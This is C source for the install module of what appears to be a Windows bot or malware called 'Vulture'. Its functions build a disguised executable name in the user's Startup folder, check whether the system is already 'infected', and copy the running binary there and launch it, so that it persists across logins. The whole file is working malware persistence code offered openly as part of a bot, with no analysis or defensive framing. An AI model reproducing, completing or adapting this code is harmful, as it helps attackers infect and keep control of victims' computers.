#include "install.h"

#include "string.h"
#include "utils.h"
#include "mem.h"

#include <Shlobj.h>

extern bot_t bot;

LPWSTR GetMalwareInstallPath(void)
{
	LPWSTR pwzStartupPath;
	LPWSTR pwzMalwarePath;
	wchar_t wzFileName[32];

	if ((pwzStartupPath = GetFolderPath(CSIDL_STARTUP)) == NULL)
		return NULL;

	memzero(&wzFileName, sizeof(wzFileName));
	bot.api.pwsprintfW(wzFileName, L"%x.exe", GetSerialNumber());

	pwzMalwarePath = StrConcatW(pwzStartupPath, wzFileName);

	memfree(pwzStartupPath);

	return pwzMalwarePath;
}

BOOL IsSystemInfected(void)
{
	LPWSTR pwzMalwarePath;
	
	if ((pwzMalwarePath = GetMalwareInstallPath()) == NULL)
	{
		return FALSE;
	}

	BOOL bIsInfected = StrCompareW(bot.wzBotPath, pwzMalwarePath);

	memfree(pwzMalwarePath);

	return bIsInfected;
}

BOOL InstallVulture(void)
{
	LPWSTR pwzMalwarePath = NULL;
	DWORD dwFileSize = 0;
	LPVOID lpFile = NULL;

	if ((pwzMalwarePath = GetMalwareInstallPath()) == NULL)
		return FALSE;

	if ((lpFile = ReadFileFromDisk(bot.wzBotPath, &dwFileSize)) != NULL)
	{
		WriteFileToDisk(lpFile, dwFileSize, pwzMalwarePath);

		if (StartFileProcess(pwzMalwarePath))
			return TRUE;
	}
	
	return FALSE;
}